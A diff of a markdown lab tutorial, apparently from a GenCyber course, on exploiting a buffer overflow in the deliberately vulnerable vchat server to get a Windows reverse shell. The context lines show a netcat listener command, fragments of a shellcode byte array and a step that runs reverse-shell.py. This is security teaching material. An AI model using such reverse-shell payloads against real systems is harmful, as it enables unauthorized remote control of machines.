@@ -273,7 +273,7 @@ This attack ubtilizes the buffer overflow vulnerability of the vulnerable chat s
 
 Here are steps:
  
-1. To receive the reverse shell (i.e. Windows console), run the following command at a terminal on Kali VM
+1. To receive the reverse shell (i.e. Windows console), run the following command in a terminal on Kali VM
 ```
 nc -l -v -p 4444
 ``` 
@@ -326,11 +326,13 @@ SHELL += b"\x27\xd1\x8d\x88\x22\x9d\x09\x61\x5f\x8e\xff\x85"
 SHELL += b"\xcc\xaf\xd5"
 ```
 
-3. Save reverse-shell.py and run the following command in the folder of /home/kali/GenCyber/vchat/Attack/ within a terminal
+3. Save reverse-shell.py and run the following command in the folder of /home/kali/GenCyber/vchat/Attack/ within another terminal
 ```
 python reverse-shell.py
 ```  
-
+If everything is right, you shall see the Windows console in the terminal running the *nc* command.
+  
+  
 Notes:
   
 *msfvenom* command options
